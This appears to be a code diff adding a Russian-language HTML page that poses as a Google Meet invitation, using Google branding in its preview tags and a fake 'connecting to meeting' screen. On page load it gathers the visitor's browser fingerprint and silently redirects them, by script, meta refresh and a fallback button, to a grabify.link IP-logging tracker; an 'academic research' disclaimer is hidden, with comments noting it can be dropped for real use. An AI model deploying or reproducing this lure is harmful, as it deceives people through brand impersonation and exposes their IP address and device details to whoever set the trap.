@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <!-- Кодировка и базовые настройки -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- === OPEN GRAPH ТЕГИ ДЛЯ ПРЕВЬЮ === -->
+    <!-- Для Facebook, ВКонтакте, Telegram, WhatsApp -->
+    <meta property="og:title" content="Google">
+    <meta property="og:description" content="Real-time meetings by Google. Using your browser, share your video, desktop, and presentations with teammates and customers.">
+    <meta property="og:image" content="https://meet.google.com/web_client/video_preview.png">
+    <meta property="og:url" content="https://google-dev-1.github.io">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Google Meet">
+    
+    <!-- Для Twitter (если нужно) -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Важная видеовстреча | Google Meet">
+    <meta name="twitter:description" content="Присоединяйтесь к совещанию по проекту">
+    <meta name="twitter:image" content="https://meet.google.com/web_client/video_preview.png">
+    
+    <!-- Стандартные мета-теги -->
+    <meta name="description" content="Ссылка для подключения к видеовстрече Google Meet">
+    
+    <!-- Заголовок страницы (виден во вкладке браузера) -->
+    <title>Подключение к видеовстрече...</title>
+    
+    <!-- === СИСТЕМА ТРЕКИНГА И РЕДИРЕКТА === -->
+    <!-- Опционально: собираем базовую информацию -->
+    <script>
+        // Данные для сбора (академические цели!)
+        const trackingData = {
+            timestamp: new Date().toISOString(),
+            referrer: document.referrer,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            urlParams: new URLSearchParams(window.location.search).toString()
+        };
+        
+        // Функция отправки данных (заглушка - в реальности отправляйте на свой сервер)
+        function sendTrackingData() {
+            console.log('Tracking data (academic use only):', trackingData);
+            // Здесь мог бы быть fetch() на ваш сервер для сбора статистики
+        }
+        
+        // Функция редиректа с задержкой
+        function performRedirect() {
+            // Отправляем данные перед редиректом
+            sendTrackingData();
+            
+            // ЦЕЛЕВАЯ ССЫЛКА ДЛЯ ПЕРЕНАПРАВЛЕНИЯ
+            const targetUrl = "https://grabify.link/track/TFIMU0"; // ЗАМЕНИТЕ на вашу ссылку
+            
+            // Вариант 1: Мгновенный редирект
+            window.location.href = targetUrl;
+            
+            // Вариант 2: Редирект с задержкой (лучше для превью)
+            // setTimeout(() => { window.location.href = targetUrl; }, 500);
+        }
+        
+        // Запускаем при загрузке страницы
+        window.onload = performRedirect;
+    </script>
+    
+    <!-- Альтернатива: редирект через meta-тег (работает без JS) -->
+    <meta http-equiv="refresh" content="2; url=https://grabify.link/track/TFIMU0">
+    
+    <!-- Стили для страницы-заглушки -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #4285F4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            color: white;
+            font-size: 36px;
+            font-weight: bold;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        
+        p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4285F4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #856404;
+        }
+        
+        .button {
+            display: inline-block;
+            background: #4285F4;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 15px;
+            transition: transform 0.3s, background 0.3s;
+        }
+        
+        .button:hover {
+            background: #3367d6;
+            transform: translateY(-2px);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">G</div>
+        <h1>Подключение к видеовстрече</h1>
+        <p>Идет перенаправление на защищенное подключение Google Meet...</p>
+        
+        <!-- Индикатор загрузки -->
+        <div class="loader"></div>
+        
+        <!-- Сообщение если JS не работает -->
+        <noscript>
+            <div class="warning">
+                <strong>JavaScript отключен</strong><br>
+                Перенаправление должно произойти автоматически. Если этого не случилось, 
+                нажмите кнопку ниже.
+            </div>
+            <a href="https://grabify.link/track/TFIMU0" class="button">
+                Перейти к видеовстрече
+            </a>
+        </noscript>
+        
+        <!-- Академическое предупреждение (можно скрыть в реальном сценарии) -->
+        <div class="warning" style="display: none;" id="academicWarning">
+            <strong>Академическое исследование:</strong> Эта страница создана для изучения 
+            методов фишинговых атак. Все данные собираются анонимно и используются 
+            исключительно в исследовательских целях.
+        </div>
+    </div>
+    
+    <!-- Дополнительный скрипт -->
+    <script>
+        // Показываем академическое предупреждение через 3 секунды
+        // (можно удалить в "боевом" сценарии)
+        setTimeout(() => {
+            document.getElementById('academicWarning').style.display = 'block';
+        }, 3000);
+    </script>
+</body>
+</html>
